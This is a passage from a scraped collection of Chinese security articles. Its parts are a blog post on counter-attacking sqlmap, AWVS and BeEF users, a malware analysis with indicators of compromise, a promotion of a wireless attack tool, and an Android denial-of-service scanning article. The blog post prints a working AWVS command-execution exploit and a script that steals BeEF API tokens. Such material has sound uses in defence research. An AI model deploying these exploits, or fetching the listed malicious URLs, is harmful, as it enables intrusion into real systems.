"5ccbfa084f2f0a0a7a69c005","工作后，越来越没有时间挖洞和写东西了（被世俗的纷争与微弱的工资束缚着），真是怠惰滴斯！&hellip;&hellip;(；&prime;⌒`) 蓝瘦&hellip;香菇&hellip;这几天看到FB上又有","dalamar","工作后，越来越没有时间挖洞和写东西了（被世俗的纷争与微弱的工资束缚着），真是怠惰滴斯！……(；′⌒`) 蓝瘦…香菇…这几天看到FB上又有了几篇有质量的RMB奖励贴，心中小小激动。仔细看了看《注意了，使用Sqlmap的你可能踩中了“蜜罐”》，作者九如把之前自己也研究过的东西写成了心得。想起了大学时候自己没日没夜研究本不是自己专业内容的身影。原来，还是有好奇心强的朋友在用不同的视角去审视现有的工具的。那么回归正题，我们就来分析一下已经爆出来的，或还没说破的那些反杀Show。# FirstBlood：Sqlmap （bash特性）本文主要延伸思维，稍微分析一下文章中实现方法的问题和解决办法：引子直接看九如的文章就好，不做重复介绍了：《注意了，使用Sqlmap的你可能踩中了“蜜罐”》之前笔者自己也本着学习的目的，研究了sqlmap的源码，那么就根据以上那篇文章，一起来分析一下：form表单里value的值过于明显，哪怕不抓包，有阅读源码习惯的人都会发现其中的不对劲儿，怎么办？确实如此，那么value中最好把payload所有字符都先urlencode一下，反正POST传入的data会在target.py进行urldecode。所以完全可以把payload全部urlencode处理，免得太过明显。 有没有什么办法，不让payload在网页的源码里裸奔呢？不如把payload放到header里好了，因为POST中以下参数全都包括在header中，并且都可以urlencode传入，因此都可以用来隐藏利用。首先，我们来看看sqlmap源码里，是怎么处理header内容的：HTTP_HEADER.USER_AGENT：https://github.com/sqlmapproject/sqlmap/blob/e77126e847984b204111d5dada9417bc74a7a376/lib/core/target.py#L328HTTP_HEADER.REFERER：https://github.com/sqlmapproject/sqlmap/blob/e77126e847984b204111d5dada9417bc74a7a376/lib/core/target.py#L336HTTP_HEADER.HOST：https://github.com/sqlmapproject/sqlmap/blob/e77126e847984b204111d5dada9417bc74a7a376/lib/core/target.py#L346https://github.com/sqlmapproject/sqlmap/blob/e77126e847984b204111d5dada9417bc74a7a376/lib/core/target.py#L712以上POSTdata的反杀方式，攻击者测试时必须进行抓包、导出datafile，才能使用--data来利用。万一他仔细看了看data内容，这样反杀不就变成送人头了么，怎么破?那就尽量不让攻击者接触到POST的data，我们改用GET来反杀，先看这里：https://github.com/sqlmapproject/sqlmap/blob/e77126e847984b204111d5dada9417bc74a7a376/lib/core/target.py#L365读过repo的都知道sqlmap在get的时候是不会主动验证并设置get中header的其他参数的，那么如果get请求进行了验证，就必须自己加上类如--cookie/--agent的参数。那攻击者在寻找package头文件里的cookie时，一定也会发现参数中奇怪的部分，左思右想，这不反杀不成了么？还是再继续看看源码里还有什么好玩的东西吧。可以注意到，sqlmap检测csrf的时候，有这么一条特性。HTTP_HEADER.CSRF_TOKEN：https://github.com/sqlmapproject/sqlmap/blob/e77126e847984b204111d5dada9417bc74a7a376/lib/core/target.py#L381从以上实现方式看，csrf被检测验证后，出于自动化步进，Sqlmap会提出交互选项Do you want sqlmap to automatically update it in further requests? [y/N]而就一般的渗透过程来说，懒得麻烦的人都会扣个Y让他继续。毕竟能自动跟进为什么我还要去手动get然后设置呢？我要的是自动化啊！（对没错，是我）你不但可以注入反杀payload，同时还可以只用get请求，就干掉攻击者。总结一下，猥琐的姿势就出来了，为了兼顾get和post，我们只需在所有请求里加上csrf伪随机验证，然后通过监控所有的页面请求，在某个页面超过20次连续同ip请求时，动态替换掉csrf规则加上你的payload。如果攻击者是个脚本小子或者马马虎虎的人，那铁定就要被反杀了。# Double kill：AWVS 10 （CVE-2015-4027）抱歉原文链接忘了在哪儿了……简要说明一下：AWVS 10 在安装后，会申请一个api服务，开启并监听8183端口，用来接收本地任务添加的调用（具体服务名称忘了……）并且这个服务跟随安装时的属性，就是说是system权限的服务。如果直接访问http://127.0.0.1:8183，可以看到一个简单的web面板用来显示所有类型的扫描任务。根据官方文档的api参数介绍：https://www.acunetix.com/blog/docs/acunetix-wvs-cli-operation//run参数将代入命令执行，且因为继承system权限，我们的命令也会以system执行。并且，发现这个漏洞的人测试了一下，在AWVS扫描的时候，js将被代入检查并且被执行了。于是，就有了隔空怀孕的姿势——插入针对AWVS-Api的“恶意js”用以反杀。参考poc：&lt;script&gt;var t = new Date()var y = time.getFullYear();var m = time.getMonth();var d = time.getDate();var h = time.getHours();var min = time.getMinutes()+1;var command = ""calc.exe"";var padding = ""http://"";for(i=0;i&lt;2048;i++)padding+=""a"";var exp = '{""scanType"":""scan"",""targetList"":"""",""target"":[""'+padding+'""],""recurse"":""-1"",""date"":""'+m+'/'+d+'/'+y+'"",""dayOfWeek"":""1"",""dayOfMonth"":""1"",""t"":""'+h+':'+min+'"",""deleteAfterCompletion"":""False"",""params"":{""profile"":""Default"",""loginSeq"":""&lt;none&gt;"",""settings"":""Default"",""scanningmode"":""heuristic"",""excludedhours"":""&lt;none&gt;"",""savetodatabase"":""True"",""savelogs"":""False"",""generatereport"":""False"",""reportformat"":""PDF"",""reporttemplate"":""WVSDeveloperReport.rep /Crawl http://scan.what /Run \\\""'+command+' \\\"""",""emailaddress"":""""}}'var xmlhttp;if(window.XMLHttpRequest){ xmlhttp=new XMLHttpRequest(); }else{ xmlhttp=new ActiveXObject(""Microsoft.XMLHTTP""); }xmlhttp.open(""POST"",""http://127.0.0.1:8183/api/addScan"",true);xmlhttp.setRequestHeader(""Content-type"",""application/x-www-form-urlencoded"");xmlhttp.setRequestHeader(""RequestValidated"",""true"");xmlhttp.send(exp);&lt;/script&gt;payload：（python）https://www.exploit-db.com/exploits/38847https://www.exploit-db.com/exploits/39755（10月29日）找到了，原文在这：如何优雅的反击扫描你网站的黑客# Triple kill：BeEF-Framework （js特性）Beefproject：http://beefproject.com大家应该都用过beef这个功能丰富的xss平台，毕竟自动化方面beef做的非常不错，但是同样beef也存在一定的被反杀风险。我们今天不是来介绍工具，而是分析其反杀的可能性的，所以，测试！上线！大家来找茬！显而易见，在点击了测试页面后，beef-panel里很快出现了我们的主机，而就一般小白用户来说，这一上线，可谓狼入虎口了，因为beef能实现的钓鱼功能、渗透功能非常之多，高仿的flash升级页面和其他隐蔽注入效果非常好，没有辨别能力的人碰到真就亚西给给了！看着安静的测试页面，大家也许都会觉得只要sever端不发出极端性的指令，一般来说是不会暴露的，但我们来看看原始页面在注入js后，是不是多了些奇怪的东西，首先beef这个存活上报功能（心跳功能）就已经很容易暴露身份了，在dev-terminal里很清楚的看到，因为每秒一个的心跳包，页面的脚本资源量在不断的增长，通过寻找最多的那条增长量，也很容易找到server服务器的位置。但是我不能每看一个页面就f12一下呀，那不得累死么？是的，所以我们来说说页面里那些不对劲儿的马脚，我是说——奇怪的var和function。不管js名称更换如何隐蔽，不管攻击者使用多么保守，通过在调试终端输入一条简单的beef,足以让它漏出马脚。可以看见，beef的版本，所有function原型，所实现函数等，全都以json形式被返回打印了出来。见招拆招，理清思路如果你是一位站长，只需要在你的站点页面里加入一条js即可：&lt;script&gt;(window.beef)?alert('Found Beef inject!'):null;&lt;/script&gt;那么这怎么算反杀呢？既然js特征能够被发现，我们继续看看，能不能有什么可以利用起来获取一些攻击方的信息。通过一句简单的函数查询，我们很容易找到hook脚本的所在位置，同样作为beef的特点，js和panel是在同一端口，所以可以通过这个动作，了解被注入的脚本信息，推断出beef的后端入口，进行反击。见招拆招！重点来了！请同学们做好笔记！看对方XSS打得这么欢，是时候带动他家一波团灭了。测试中，我们先假作为攻击者，访问以下自己后端的页面。http://127.0.0.1:3000/ui/modules/getRestfulApiToken.json没错，这就是显示我们后端BeEF的RestfulApiToken值的一个json！（10月29日）我真不知道为什么这个ApiToken会以json形式直接暴露出来，讲道理我运行beef的ruby脚本时候你print出来了就够了嘛……那么，只需要能得到ApiToken，即可控制server端的行动！接下来，将我们注入到自己测试页面的那段js改成（笔者测试引用了jquery的$.get方法）：&lt;script src='http://cdn.bootcss.com/jquery/3.1.1/jquery.min.js'&gt;&lt;/script&gt;&lt;script&gt;(window.beef)?alert('Found Beef inject!\nbfToken: '+$.get({url:""http://127.0.0.1:3000/ui/modules/getRestfulApiToken.json"",async:false}).responseJSON.token):null;&lt;/script&gt;当攻击者自己访问到页面的时候，就可以将beefToken拿到手。当然你可以不alert出来打草惊蛇，而是发送到自己服务器的后端或记录到网站的log里今后慢慢品尝，或者干脆全自动化天降正义。（10月30日更）再次测试后发现，beef的ApiToken是动态生成的，只有登陆后，才会出现Token，在心跳包断连的时候，是获取不到后台Admin的Token的，那个json的页面也会获取不到，但是beef参数和所有脚本function还是存在。这意味着，如果检测到页面有beef的参数，证明页面被注入了beef的XSS脚本；如果同时通过xhr动态获取到了ApiToken，那只有一种可能——攻击者和你，同时在线！赶紧争分夺秒搞事！笔者将之前的小脚本稍稍改进了一下，更改为两步，第一步仅仅验证是否有beef脚本注入，第二步如果攻击者在线，再进行遍历爆破，提取ApiToken：&lt;script src='http://cdn.bootcss.com/jquery/3.1.1/jquery.min.js'&gt;&lt;/script&gt;&lt;script&gt;    var bfPath = ['ui','admin','beef','hack','xss','manager','dashboard','test','menu','123456'];    var bfHost = [beef.net.host,'127.0.0.1','localhost','0.0.0.0']    function getApi(host, path) {        return $.get({url:beef.net.httpproto+'://'+host+':'+beef.net.port+'/'+path+'/modules/getRestfulApiToken.json',async:false}).responseJSON;        }    (window.beef)?alert('Found BeefJs inject!\n\nJsfile is:\n'+beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+beef.net.hook):null;    for (var n=0;n&lt;bfHost.length;n++) {        var h = bfHost[n];        for (var i=0;i&lt;bfPath.length;i++) {            var p = bfPath[i];            (getApi(h,p))?alert('Found Beef is Online!:\n\nServer At:\n'+beef.net.httpproto+'://'+h+':'+beef.net.port+'/'+p+'/panel'+'\nApiToken:\n'+getApi(h,p).token):null;        }    }&lt;/script&gt;（bfPath / bfHost 为爆破字典，数组格式存储，可自行添加。）这只是个简单的alert示范脚本，实际生产环境中，完全可以将alert替换为自己的function，比如自动化利用Api套取攻击者所获取的其他session，再比如，立马注销掉自己的所有cookie等，大家开动脑筋~其他事项就像js演示脚本中，如果攻击者注入的是外网地址的js，而他登陆平台是用的localhost/127.0.0.1/0.0.0.0/192.168.x.x那就挨个枚举get一下就好，总会有一个是对滴~如果攻击者改变了设置中panel的位置，就是说功能目录不是叫ui了那就靠一个简单的遍历爆破吧，除非这个攻击者谨慎到把后台设置为/ni_jue_dui_zhao_bu_dao_wo_lalala_56789/panel，那就无法反杀了，但是也能尽快响应、注销cookie、清除被注入的脚本什么的，避免损失扩大嘛。关于RESTfulApi利用，因为Api也验证了Session，所以自己单独使用Api是不可能的了，那么就得靠大家用XSS的方式，插回去反杀攻击者，多多判断if(blablalba){do blablabla}就好了，只要动静不太大，别满console的error，没谁哪个攻击者会开着beef还分分钟看devTerminal的~为了大家猥琐思路能继续延伸，贴上beefAPI说明书：BeEF-RESTful-API打枪的不要，这么悄悄地，我就再提个醒！Beef源码中有个2个Api入口是提供给内部调用的，没有写到Doc里，其中有一个是用来将msf_payload或者flash钓鱼包类似的需要暴露的文件布置到web外端的，为的是payload文件暴露出去能够给外部访问或下载，那么……我们用这个接口来暴露一下beef的Config文件呢？(｡･∀･)ﾉﾞ答对了，那就能拿到beef的配置、用户名、密码，然后阿姨洗铁路了。然后……然后就不说破了吧~留半个气口，不说了~嘿嘿~⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄# 把脸凑过来，我给你看个宝贝！总而言之，很多工具因为自己的特性，或者为了实现刺探信息的更多功能，亦或是实现完美的自动化，难免会暴露出一些自己弱点。正所谓“你想看我的宝贝，那就得把脸凑过来”……（大概就是这个意思吧，呵呵呵呵）凑过来了，就容易挨揍…… ┑(￣Д ￣)┍文章写了很久了，两个星期前就打算发，一直工作忙着没时间认真排版和配图，怠惰滴斯！但是不能向怠惰势力低头！有研究还是得发出来的~还有几个开源工具，笔者自己也还正在研究呢，而且有点东西没太明了，正在琢磨中……等这个beef的还有其他一些相关项目研究完，我会在年底汇总成一个开源的小项目（工作之余，可能延误）。咳咳，毕竟，吹出去的牛逼才有动力去实现嘛~卖个关子吧，这个小小的项目将会很流弊！涉及网络安全，算得上是辅助类小工具，有点偏向开发辅助类型。不能老看看不动手嘛，突破创新深化改革，自己也得用发展的眼光去看现在的安全行业。# 感想以上的这些姿势，其实网藤或者盒子，完全可以做个项目，全网感知做出一个动态的拓扑图，去按特征定位“病原体”。这就和我现在的行业有点像了，医疗科研项目，做病原识别和提前干预，对病原特征进行标记，人工诱导触发方向，获得病原信息后消灭，就和预防针差不多。1）试想，如果提前注册掉或者反复循环注册工具所用的function或者var，不就做到了打乱内部功能的作用么，我在每个页面放上育苗，等碰到了真正的病原，再触发进行主动侵蚀。2）所有的下载，都不用下载完再检查了，不是有服务器安全管家么？联动一下，每个站点自己放白名单，浏览器先检测白名单，再检测下载链接，如果超出可下载源直接禁止下载，再提醒站长出现非法链接。3）支付链接什么的，直接浏览器解析一遍，乙方信息不符直接ban掉二维码就是了。很多隐形的特征，浏览器都可以帮忙完成判断的。3什么0，什么迅，什么啥的浏览器，来个某厂做成个内部功能，检查页面函数与function，这一下就变成“我大xx浏览器完美感知黑客行为，提前预防，防范未然”了。（mark一下，万一真被某厂把功能实现了，请稍稍提名我一下，蟹蟹，嘿嘿哒~）现代社会没人能离开网络，既然大家都在接触，那么大家都能参与改造。其实我们每个人都是网络安全发展的历史见证者，同时也是缔造者，为什么不尝试着参与进来呢？# 写在最后一血二血或多或少是网上已经公布过的，仅仅在前人基础上做了点研究，早就看过的大牛们就略过吧。最后才补充了一点自己对beef的研究与发现，暂且提到的比较浅层，早已有过研究的朋友们也可以忽略。非提问和指正的留言，我就不回复了，最后感言，就看看笑笑好了，轻点喷。如果文章里有思绪混乱的地方，欢迎大家多多指正。炎夏清风，吹霾散云，寒秋有雨，雨过天晴。","2016-11-02 16:05:03","网络安全","使用各种扫描工具的你，不但踩了“蜜罐”可能还要被团灭了","http://nsoad.com/Article/Network-security/20161102/680.html"
"5ccbfa084f2f0a0a7a69c006","经常使用手机浏览器阅读小说的用户都知道，在浏览器页面经常会出现一些推广游戏应用、手机清理应用等应用推广型的弹窗广告。有时出于方便，我们也会选择直接点开这些弹窗广","Kong","经常使用手机浏览器阅读小说的用户都知道，在浏览器页面经常会出现一些推广游戏应用、手机清理应用等应用推广型的弹窗广告。有时出于方便，我们也会选择直接点开这些弹窗广告进行应用下载。但这种行为并不安全，部分恶意应用会首先伪装成“正规军”诱导用户进行下载。一旦用户下载安装成功，该应用便大肆入侵用户手机，劫持浏览器进行仿冒应用的广告推送，甚至静默安装其它未知应用。近期安天移动安全威胁情报分析团队就捕获了一例新的恶意应用Booster Cleaner。该恶意应用伪装得十分隐蔽，它表面看起来是一款“清理手机内存”的应用，与其他手机管理软件并无区别。实际上在后台，它会劫持浏览器弹出指定网页来进行广告推送，引诱用户安装仿冒应用，并且在用户毫不知情的情况下静默安装各种未知应用，给用户带来极大的隐私泄露风险和巨大的资费消耗。一、 Booster Cleaner简介· Booster Cleaner基本信息 二、 Booster Cleaner详细分析· Booster Cleaner运行流程Booster Cleaner是怎样一步步利用用户手机”胡作非为“的呢？简单来说，分为四步：劫持浏览器推送应用→私自提权解密→回传用户隐私→静默下载安装应用。Step1.劫持浏览器推送应用Booster Cleaner利用某广告服务器上传设备信息，返回指定的url来获取推送广告的配置信息，如下图所示：恶意应用在后台持续监控用户手机顶层窗口应用包名，当包名匹配到预设的包名时，便向劫持浏览器界面推送广告，诱导用户下载未知应用，推送间隔时间为1小时。据统计，目前很多常用的浏览器都被劫持了，具体如下表所示：Step2.私自提权解密当用户下载该应用后，该应用会通过Asysset.dex文件实现提权，该dex由asysup.so释放，具体步骤如下：（1）下载aice文件解密解压释放子包和提权文件。（2）通过解密png.ico释放提权工具和锁定文件工具，下图中r1—r4分别是四种root方案，利用了CVE-2012-6442、WooYun-2013-21778、CVE-2013-6282等漏洞来进行root提权。（3）利用漏洞提权并执行脚本拷贝子包ice.apk到系统应用目录来提升子包权限。 Step3.回传用户隐私提权成功后，该应用会将提权结果信息和隐私信息上传至指定位置，同时，也会上传安装应用列表信息。具体来说，它会上传以下数据：安装应用列表信息会上传至指定位置，具体如下图代码所示：Step4.静默下载安装应用子包ice.apk主要恶意行为是：向远程服务器获取未知应用下载地址，后台私自下载未知应用，静默安装。解密数据保存在本地数据库，如下图:后台通过查询数据库获取下载列表，下载推送的应用：获取Root权限后，通过pm指令静默安装app:通过分析，目前静默安装的应用多为仿冒应用，主要仿冒应用如下表所示： · Booster Cleaner 恶意代码详解恶意代码植入模块结构如下图所示：  三、攻击者追溯· 域名该事件中涉及到了多个相关域名，通过AVL Insight情报聚合，我们发现恶意应用涉及的多个域名注册者名称多为Simon。（数据来源：AVL Insight移动威胁情报平台）· 主要传播途径Booster Cleaner主要在国外某些小型应用市场或者其他第三方应用市场传播，其中一些hash的来源地址如下：ufile.ucloud.com.cn/micfile/apk/6032bca0e75e4d149a6ec640221beb4e.apkrogsob.com/7/PhotoEditor012902.apkwenzhuotc.com/upload/app/apk/20160506163243/Flashlight03.apkvademobi.com/apks/a03db38c-b0ff-4c01-8f43-51f8963d35f4.apk感染量较大的包名以及应用名如表格所示：· 感染用户分布通过AVL Insight平台监控，截止到2016年10月19日，已有4989例受害者信息；最近一个月，共有281例受害者信息，感染用户地区分布如下：（数据来源：AVL Insight移动威胁情报平台）从图中可知，现阶段Booster Cleaner受害者多为国外用户，其中，以南亚和东南亚用户最多；从广告注册商方面来看，也是国外厂商，且广告商与应用存在密切的利益关系；从手法上来看，广告植入和运行手法都较为隐蔽，且进行了较为专业的加密处理，因此，很有可能是团伙作案。虽然，从目前来看，受害范围都在国外，但这种运作模式在国内也很常见，因此不排除部分战略技术向国内转移的可能。· 总结Booster Cleaner 恶意应用伪装成正规的内存清理软件，诱导用户下载，当用户下载安装后，该应用开始运行并偷偷窃取用户隐私信息，同时通过劫持用户手机浏览器，不断地推送未知应用广告，激起用户的好奇心，诱导用户下载。不仅如此，Booster Cleaner还会在用户不知情的情况下，静默安装大量未知应用，持续地进行更深层次的恶意行为，手段隐蔽且成本较低，让人防不胜防。值得注意的是，该恶意应用与广告商之间存在密切的利益往来，且包含上传用户隐私、推送广告等常见的可获利恶意行为。联想最近国内发生的多起电信诈骗事件，事件中的受害者被不法分子利用个人隐私信息骗取信任，后续进行诈骗行为。该应用的恶意开发者后续也存在利用窃取的隐私信息对感染用户进行精准电信诈骗的潜在可能，给感染用户财产带来极大的安全隐患。四.安全建议针对 Booster Cleaner之类的恶意应用，安天移动安全威胁情报分析团队提醒您：请保持良好的上网习惯，不要在非官方网站或者不知名应用市场下载任何应用；谨慎点击安装浏览器弹窗广告推送的应用，不安装来源不清楚的应用；不要轻易授权给不信任的软件Root权限；如果您已经中了类似病毒，建议您使用Root工具将设备进行Root，使用杀毒软件及时查杀病毒。查杀完成后，如您不再使用Root，请务必使用Root工具取消Root，避免Root权限被滥用带来的设备安全问题。安天移动安全专注于移动互联网安全技术研究及反病毒引擎研发，为合作伙伴提供强大的移动安全解决方案。AVL Insight 移动威胁情报平台主要用于呈现移动威胁的高价值情报信息， 通过对移动威胁的全面感知能力和快速分析响应能力，提供应对移动威胁的预警和处置策略，为客户移动终端安全保驾护航。五. 附IOC：hash7FBA76AB76D65476180371FD66DDD3EF5613C4C4FCA8F20669CAF58035C1F8A5B7C354EEA5366783F6C0C5A8C46FABF2AA03EC20A7AA03092818943DCCB030251A4F8F66297437B55D8F3FFFDE12249DD4D041563A21528F789D1DB95C8197724639AAB9A6FB6BF3F5DDFF47D04EB02E0B55D63F0B1A75F5E8A362D457E62A79domainhttp://api.zoomyads.com/zoomy-advert/inter/getHeartbeatInfo.shtmlhttp://cdn.6mailer.com:8080/jar/kk0512.pnghttp://54.179.132.156/zoomy-root-test/test/testapihttp://54.179.132.156/zoomy-root-test/test/uploadfilehttp://zad.zadmobi.com/mic/plhttp://ufile.ucloud.com.cn/micfile/apk/6032bca0e75e4d149a6ec640221beb4e.apkhttp://rogsob.com/7/PhotoEditor012902.apkhttp://wenzhuotc.com/upload/app/apk/20160506163243/Flashlight03.apkhttp://vademobi.com/apks/a03db38c-b0ff-4c01-8f43-51f8963d35f4.apk","2016-10-27 01:07:53","移动安全","恶意软件伪装“正规军”，撕开Booster Cleaner“画皮”下的真相","http://nsoad.com/Article/MobileSecurity/20161027/648.html"
"5ccbfa114f2f0a0a7a69c007","Hijacker 是一个安卓平台下的无线渗透工具。","Kong","Hijacker 是一个安卓平台下的无线渗透工具。它的功能非常强大，几乎集成了 aircrack-ng 套件，mdk3 和 reaver 这些工具的功能。而且采用图形化用户界面，相比命令行界面，使用起来也更加的方便简单！     想要成功运行 Hijacker，我们首先需要一台 Android 设备 和一块支持监听模式的无线网卡。这里需要说明的是，只有少数一部分 Android 设备支持该模式，但是它们没有一个是原生的  Android 系统。这意味着你需要自定义一个固件。这里我推荐大家使用 Nexus 5 设备，它使用的 BCM4339 芯片（除此之外，像 Xperia Z2，LG G2 等设备使用的 MSM8974 芯片）都可以很好的与    Nexmon 驱动（同时它还支持一些其它的芯片组）一起工作！ 此外，使用 BCM4330 芯片的设备，还可以使用 bcmon 。 另一种方法是在 Android 设备中，使用支持 OTG 线连接一个支持监听模式的外部适配器。所有的无线工具都包含在 Hijacker 中（仅适用于 armv7l 设备）。 在你初次运行该软件时，它会询问你是否安装这些工具。如果你选择不安装，那么你可以在之后的设置中，再次进行安装。还有一点也非常重要，就是我们的设备必须要取得 root 权限。因为，只有在 root 权限下这些工具才能正常运行使用！     功能： 列出你周围的 无线 AP 和 客户端（即使是被隐藏的）         查看网络的活动（通过测量信标和数据包）及其客户端         断开网络中的所有客户端连接断开指定客户端的网络连接         自定义 SSID 列表的 MDK3 Beacon 泛洪         MDK3 身份验证 DoS 指定目标或所有人         尝试获取 WPA 握手包或收集 IVs 破解 WEP 网络         有关接入点的统计信息（仅现在加密）从 OUI 数据库（从 IEEE 提取）查看设备的制造商         查看设备的信号功率，过滤出更接近你的设备的信号功率         支持后台运行，并可选择显示通知         将 命令 或 MAC 地址 复制到剪贴板，当应用出现错误时，你就可以在终端中来继续执行            Reaver WPS 破解（pixie-dus 攻击使用 NetHunter chroot 和 外部适配器）         通过自定义字典表破解 .cap 文件         将捕获的数据包，保存为 .cap 文件         创建要在无线接入点或客户端上，单击运行的自定义命令安装要求：使用的 Android 系统为 5 以上 版本         设备必须已取得 root 权限。 如果使用 CM，请安装 SuperSU         已安装 busybox         设备固件 支持监听模式当你第 一次运行 Hijacker 时，它会询问你是否要设置安装工具或转到主菜单。如果你已经安装了固件和所有工具，你可以直接转到主菜单。如果未安装，那么你可以单击设置以安装工具。这里你还可以更改工具的安装目录，但建议大家按照默认的目录安装！请记住，在某些设备上，在 /system 目录中安装文件，可能会触发 Android 的安全机制，并且你的系统分区将在你重启时恢复。安装工具和固件（仅 Nexmon）后，你将登陆到主菜单，airodump 将会启动。如果你没有看到任何网络，请检查你是否已 启用 WiFi 功能，并置入到监听模式！如果运行中出现问题，你可以到设置界面，单击选择 “Test Tools（工具测试）” 选项，来对这些工具进行检测。如果检测结果正常，那么可是你没有启用监听模式。如果检测结果异常，你可以选中检测失败的工具，单击 “Copy test command（复制测试命令）” 将它们复制到剪贴板。这样你就可以使用终端来运行这些命令，并查看具体原因。Hijacker 项目地址：https://github.com/chrisk44/Hijacker/releases","2017-01-05 14:19:17","安全工具","安卓无线渗透利器：Hijacker","http://nsoad.com/Security-tools/20170105/tools-983.html"
"5ccbfa124f2f0a0a7a69c008","阿里聚安全的Android应用漏洞扫描器有一个检测项是本地拒绝服务漏洞的检测，采用的是静态分析加动态模糊测试的方法来检测，检测结果准确全面。本文将讲一下应用漏洞扫描器在","Kong","阿里聚安全的Android应用漏洞扫描器有一个检测项是本地拒绝服务漏洞的检测，采用的是静态分析加动态模糊测试的方法来检测，检测结果准确全面。本文将讲一下应用漏洞扫描器在针对本地拒绝服务的检测方法。一、本地拒绝服务产生原因和影响Android应用使用Intent机制在组件之间传递数据，如果应用在使用getIntent()，getAction()，Intent.getXXXExtra()获取到空数据、异常或者畸形数据时没有进行异常捕获，应用就会发生Crash，应用不可使用（本地拒绝服务）。恶意应用可通过向受害者应用发送此类空数据、异常或者畸形数据从而使应用产生本地拒绝服务。阿里聚安全的博客以前有一篇文章《Android应用本地拒绝服务漏洞浅析》，里面详细讲了产生本地拒绝服务的四种情况：1、NullPointerException空数据异常：应用程序没有对getAction()等获取到的数据进行空指针判断，从而导致空指针异常而导致应用崩溃。2、ClassCastException类型转换异常：程序没有对getSerializableExtra()等获取到的数据进行类型判断而进行强制类型转换，从而导致类型转换异常而导致应用崩溃。3、IndexOutOfBoundsException数组越界异常：程序没有对getIntegerArrayListExtra()等获取到的数据数组元素大小的判断，从而导致数组访问越界而导致应用崩溃。4、ClassNotFoundException异常：程序没有无法找到从getSerializableExtra ()获取到的序列化类对象的类定义，因此发生类未定义的异常而导致应用崩溃。当应用被恶意应用攻击时，本地拒绝服务一般会导致正在运行的应用崩溃，首先影响用户体验，其次影响到后台的Crash统计数据，另外比较严重的后果是应用如果是系统级的软件，可能导致手机重启。Nexus 5曾经出现过这样的情况，它预装了一个用来测试网络连通性的系统应用，这个应用是隐藏状态，无法在桌面上打开，包名为com.lge.SprintHiddenMenu。在Android 4.4.3之前的版本里，这个应用里有大量导出的activity，这些 activity不需要任何权限就可以被外部调用。其中一个为com.lge.SprintHiddenMenu.sprintspec.SCRTN的组件是导出的，并且没有任何权限限制，给它发送一个空Intent，可导致Nexus 5手机重启。二、阿里聚安全扫描器的进化提升一个简单的本地拒绝服务类漏洞，要想进行大规模的自动化扫描，扫描器也要做不少的工作，并且随着对本地拒绝服务漏洞的认识，阿里聚安全的漏洞扫描器也在不断进行优化提高。2.1 空Intent阶段这个阶段的扫描器是初级阶段，一般只是通过AndroidManifest.xml文件获取应用导出的组件，然后使用adb命令发送空intent给导出组件，捕获应用日志输出，查看是否有崩溃产生。针对空Intent导致的本地拒绝服务情况可发送如下命令测试：adb shell am start -n com.jaq.dosappsample/.DosActivityadb shell am startservice -n com.jaq.dosappsample/.DosServiceadb shell am broadcast -n com.jaq.dosappsample/.DosReceiver何为导出的组件？在AndroidManifest.xml文件中如果应用的组件android:exported属性显式指定为“true”，或者并没有显式指定为“true”也没有显式指定为“false”，什么也没有写，但是有intent-filter并指定了相应的Action，则此组件为导出的组件。2.2 解析Key值阶段空Intent导致的拒绝服务毕竟只是一部分，还有类型转换异常、数组越界异常等导致的本地拒绝服务。在解析Key值阶段扫描器需要分析组件代码中是否使用了一些关键函数。在Activity组件中的onCreate()方法中，Service组件中的onBind()和onStartCommand()方法中，BroadcastReceiver组件的onReceive()方法中，如果组件没有做好权限控制，都可接受任意外部应用传过来的Intent，通过查找getIntent()、getAction()和getXXExtra()这些关键函数，检测其是否有try catch异常保护，如果没有则会有本地拒绝服务风险。在这一阶段扫描器遇到的挑战是找到这些关键函数中的Key值，Action值，不仅要找到，还要找到key对应的类型，来组装adb命令，发送命令给安装好的应用进行测试。2.3 通用型拒绝服务阶段2015年年初的时候，业界又爆出了通用型拒绝服务，由于应用中使用了getSerializableExtra() 的API，应用开发者没有对传入的数据做异常判断，恶意应用可以通过传入序列化数据，导致应用本地拒绝服务。此种方法传入的key值不管是否与漏洞应用相同，都会抛出类未定义的异常，相比解析Key值阶段通用性大大得到了提高。针对这个常用的手工检测POC代码如下：此阶段扫描器遇到的难题是无法直接通过adb命令进行测试，因为无法用adb命令传递序列化对象给应用。业界大部分漏洞扫描器也因为无法发送序列化对象给应用都止步解析Key值组装adb命令阶段，而阿里聚安全的漏洞扫描器能够发送序列化对象数据给指定的应用，再结合静态分析查找导出的组件和关键函数，动态运行应用，精确识别出会发生本地拒绝服务的应用组件，同时实现了大规模自动化测试。2.4 动态注册BroadcastReceiver阶段BroadcastReceiver组件一般分为两种，一种是静态注册，提前在AndroidManifest.xml声明组件；另外一种是动态注册，在代码中使用registerReceiver()方法注册BroadcastReceiver，只有当registerReceiver()的代码执行到了才进行注册。动态注册BroadcastReceiver的常见使用方法如下：很多开发者没有意识到，如上使用registerReceiver()方法注册的是全局BroadcastReceiver，和静态注册BroadcastReceiver android:exported属性为true性质一样，如果没有指定权限访问控制（permission参数），可以被任意外部应用访问，向其传递Intent，根据具体情况产生的危害可能不同，一种比较普遍的情况是容易产生本地拒绝服务漏洞。动态注册BroadcastReceiver导致导出的Receiver这种情况非常少被大家注意，现有的一些安全检测工具、扫描器都不能发现动态注册的BroadcastReceiver。在此阶段，动态注册BroadcastReceiver隐藏在所有代码中，在应用的任何地方都可能出现，需要扫描器全局分析应用的代码找出关键函数registerReceiver，还要找出其IntentFilter所设置的Action和Receiver的权限设置，现在一般一个普通的正常Android应用都有几十M的大小，反编译成smali代码会更多，扫描器遇到的挑战主要是查找的时间和空间挑战，还有多个参数查找的准确性。目前业界只有阿里聚安全的扫描器有准确扫描动态注册BroadcastReceiver导致的本地拒绝服务的能力。通过阿里聚安全的漏洞扫描器对一些样本进行了检测，也发现了不少动态注册BroadcastReceiver导致的本地拒绝服务攻击。三、本地拒绝服务漏洞现状为了了解本地拒绝服务漏洞的现状，阿里聚安全的应用漏洞扫描器针对国内外的各行业主要APP进行了扫描，共扫描了三百多款APP。国内行业主要是通过采集国内某应用市场的APP，我们采集了各个行业的TOP 